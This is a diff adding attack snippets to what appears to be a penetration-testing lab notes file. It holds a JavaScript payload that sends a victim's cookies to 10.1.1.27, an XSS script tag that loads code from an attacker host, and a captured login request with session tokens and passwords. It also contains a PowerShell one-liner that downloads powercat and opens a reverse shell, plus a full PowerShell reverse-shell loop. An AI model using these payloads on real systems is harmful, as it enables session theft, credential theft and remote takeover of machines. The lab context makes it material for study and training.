@@ -1,1 +1,52 @@
 https://docs.google.com/presentation/d/18OL7Rc5yFI_xRoemgahTeSQoXvv18EZwPvsfnr1wiT8/edit#slide=id.g2a814c72d3c_2_561
+let cookie = document.cookie
+let encodedCookie = encodeURIComponent(cookie)
+fetch("http://10.1.1.27/exfil?data=" + encodedCookie)
+
+ <script src="http://192.168.45.197:9088/xss.js"></script>
+ssh lab@redlab -D
+POST /auth HTTP/1.1
+Host: 192.168.240.126
+Content-Length: 482
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.240.126
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykpK3rHYvlcFcryhZ
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.240.126/login
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=b25e972873ad60262454db6b71e64fa7; XSRF-TOKEN=eyJpdiI6InBvNlBsczZ6b29KVFpCTlRtSmhXeGc9PSIsInZhbHVlIjoiUG1yUThGcTkzSkFaRUZtRU03cHRFcGJvZmc5QW9rVkVDYnozdU9qTkZPTThweGhoR1dRNmRTSG9zUlMzZk1KUDZKUTJpUGxxS0VXUUJPaGdlcHhXbnF4SFA2TjJXajdnK05INW9hTDcrQXJRZXpLV1kwZi9BYlpCQlZPYnY5aCsiLCJtYWMiOiJmYjIyY2E1MDY2MzAxNTc5NzhjZTQyYzE2ZGE1YjM3MWQyMTcxYmQ0NGRjNzM2NWNjMGYxNGZkOTc5N2EyMTZhIn0%3D; laravel_session=eyJpdiI6IjVQeGloVGI2S0taVFVUK0Q3aXVtaEE9PSIsInZhbHVlIjoiV3FQQ3hKcStTK2JmaU42K21PekVrbWZtbzE1NVQ3SmZuN0gvT21xaWkrTDZBMitRdzVRU1NFd3I4cTFTWXhOTkRMbWRmSW1VRU53TlByVVJNTHQzQWdhaVRjMStoWU1SSjAxWEtKU20yNXNmdTdTYW0ya29lbjRxQWFOcHo0SzIiLCJtYWMiOiI5ZjJlOTIwMmI2NzQ0OGQxNTM3OGFhYWZkZjNiNTU4MDkzYjhjYWQ1MWFiODk1YTU2ZTg2ZGZjYmVkYTZiMzc2In0%3D
+Connection: close
+
+------WebKitFormBoundarykpK3rHYvlcFcryhZ
+Content-Disposition: form-data; name="_token"
+
+fRUp2lmBaoAtaXtlRDbGYjt5oeir6EOmoGC1GqhV
+------WebKitFormBoundarykpK3rHYvlcFcryhZ
+Content-Disposition: form-data; name="username"
+
+admin
+------WebKitFormBoundarykpK3rHYvlcFcryhZ
+Content-Disposition: form-data; name="password"
+
+123456
+------WebKitFormBoundarykpK3rHYvlcFcryhZ
+Content-Disposition: form-data; name="dType"
+
+loginRequest
+------WebKitFormBoundarykpK3rHYvlcFcryhZ--
+
+
+
+
+admin:djj28hah*dhk2hd1%
+
+
+
+yashma ransomeware
+powershell -exec bypass powershell
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.1.1.27/powercat.ps1');powercat -c 10.1.1.27 -p 4444 -e cmd"
+$LHOST = "10.1.1.27"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
+
